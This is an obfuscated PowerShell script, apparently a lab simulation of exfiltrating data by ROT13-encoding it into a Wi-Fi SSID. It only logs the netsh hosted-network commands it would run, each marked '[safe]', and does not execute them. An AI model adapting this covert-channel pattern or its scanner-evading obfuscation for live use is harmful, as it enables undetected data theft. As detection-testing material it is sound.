function inVoKe`-`SsIDe`xf`IL {
    [CmdletBinding()]
    param(
        [switch]$ExfilOnly,
        [switch]$Decode,
        [string]$StringToExfiltrate,
        [string]$StringToDecode
    )

    function CONv`erTt`O-roT`13 {
        param([string]$InputString)

        $builder = New-Object S`ystEm`.teXt.S`T`Ri`NGbU`iLdEr
        foreach ($char in $InputString.('To'+'Cha'+'rArray').Invoke()) {
            $code = [int][char]$char
            switch ($code) {
                { $_ -ge 65 -and $_ -le 90 } {
                    [void]$builder."Ap`pE`ND"([char]((($_ - 65 + 13) % 26) + 65))
                    continue
                }
                { $_ -ge 97 -and $_ -le 122 } {
                    [void]$builder."a`PpEND"([char]((($_ - 97 + 13) % 26) + 97))
                    continue
                }
                default {
                    [void]$builder.('Appe'+'nd').Invoke($char)
                }
            }
        }

        return $builder.('ToS'+'tring').Invoke()
    }

    $artifactDir = Join-Path $PSScriptRoot "artifacts\ssid-exfil"
    if (-not (Test-Path $artifactDir)) {
        $null = New-Item -ItemType D`I`RectOry -Path $artifactDir -Force
    }

    if ($Decode) {
        $decoded = ConvertTo-ROT13 -InputString $StringToDecode
        Write-Output "[safe] Decoded value: $decoded"
        return
    }

    if ($ExfilOnly) {
        $plainText = $StringToExfiltrate
    }
    else {
        $plainText = "LAB:alice:hello"
    }

    if ([string]::('Is'+'NullOrWhi'+'teSpa'+'ce').Invoke($plainText)) {
        throw "StringToExfiltrate cannot be empty."
    }

    if ($plainText."Le`NgTh" -gt 32) {
        throw "The simulated SSID payload must be 32 characters or fewer."
    }

    $ssidName = ConvertTo-ROT13 -InputString $plainText
    $logPath = Join-Path $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=`"$ssidName`" key='HardtoGuess!@#123'",
        "[safe] Would run: netsh wlan start hostednetwork",
        "[safe] Plaintext source: $plainText",
        "[safe] ROT13 SSID: $ssidName"
    )

    Set-Content -Path $logPath -Value $commands -Encoding Ut`F8

    Write-Output "[safe] Simulated SSID exfiltration value: $ssidName"
    Write-Output "[safe] Actions logged to $logPath"
}

Invoke-SSIDExfil -ExfilOnly -StringToExfiltrate "LAB:alice:hello"
